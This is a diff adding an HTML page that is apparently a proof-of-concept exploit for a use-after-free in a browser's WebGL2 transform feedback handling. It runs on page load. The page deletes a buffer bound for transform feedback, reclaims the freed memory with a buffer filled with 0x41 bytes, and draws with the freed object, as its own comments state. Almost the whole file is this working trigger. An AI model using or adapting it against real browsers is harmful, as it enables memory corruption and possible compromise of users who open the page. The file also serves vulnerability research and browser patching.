@@ -1,0 +1,121 @@
+<html>
+    <head>
+        <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
+        <META HTTP-EQUIV="Expires" CONTENT="-1">
+    </head>    
+    <script type="vertex" id="vs">
+        #version 300 es
+        
+        layout (location=0) in vec4 position;
+        layout (location=1) in vec3 color;
+        
+        out vec3 vColor;
+        out float sum;
+
+        void main() {
+            vColor = color;
+            gl_Position = position;
+        }
+    </script>
+    <script type="fragment" id="fs">
+        #version 300 es
+        precision highp float;
+        
+        in vec3 vColor;
+        out vec4 fragColor;
+
+        void main() {
+            fragColor = vec4(vColor, 1.0);
+        }
+    </script>
+    <body onload="poc()">
+        <canvas id="canvas" width="1024" height="1024"></canvas>
+    </body>
+
+    <script>        
+        function build_link_program()
+        {
+            var vsSource = document.getElementById("vs").text.trim();
+            var fsSource = document.getElementById("fs").text.trim();
+            
+            var vertexShader = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(vertexShader, vsSource);
+            gl.compileShader(vertexShader);
+
+            if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(vertexShader));
+            }
+
+            var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(fragmentShader, fsSource);
+            gl.compileShader(fragmentShader);
+
+            if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
+                console.error(gl.getShaderInfoLog(fragmentShader));
+            }
+
+            var program = gl.createProgram();
+            gl.attachShader(program, vertexShader);
+            gl.attachShader(program, fragmentShader);
+
+            gl.transformFeedbackVaryings(
+                program,
+                ['sum'],
+                gl.SEPARATE_ATTRIBS,
+            );        
+
+            gl.linkProgram(program);
+
+            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
+                console.error(gl.getProgramInfoLog(program));
+            }
+            return program;            
+        }
+
+        function poc()
+        {
+            canvas = document.getElementById("canvas");
+            gl = canvas.getContext("webgl2"); //create to webgl2 context.
+            gl.clearColor(0, 0, 0, 1);
+
+            var program = build_link_program();
+            gl.useProgram(program);
+
+            var positions = new Float32Array([
+                -0.5, -0.5, 0.0,
+                0.5, -0.5, 0.0,
+                0.0, 0.5, 0.0
+            ]);
+            const tf = gl.createTransformFeedback();
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+
+            var ab = new ArrayBuffer( 0x1c8 );
+            var f64 = new Float64Array(ab);
+            var data = new Uint8Array(ab).fill(0x41);
+
+            var sumBuffer = gl.createBuffer();
+            
+            gl.bindBuffer(gl.ARRAY_BUFFER, sumBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, 24, gl.STATIC_DRAW);        
+            
+            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, sumBuffer);
+            
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, null);
+
+            var positionBuffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
+            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
+            gl.beginTransformFeedback(gl.TRIANGLES);
+
+            var dummy = gl.createBuffer();
+            gl.bindBuffer( gl.ARRAY_BUFFER, dummy);
+
+            gl.deleteBuffer( sumBuffer ); //free buffer object
+            gl.bufferData( gl.ARRAY_BUFFER, data, gl.DYNAMIC_DRAW ); //reclaim
+
+            gl.drawArrays(gl.TRIANGLES, 0, 3); //in drawArrays, use freed buffer object.
+            
+        }
+    </script>
+</html>
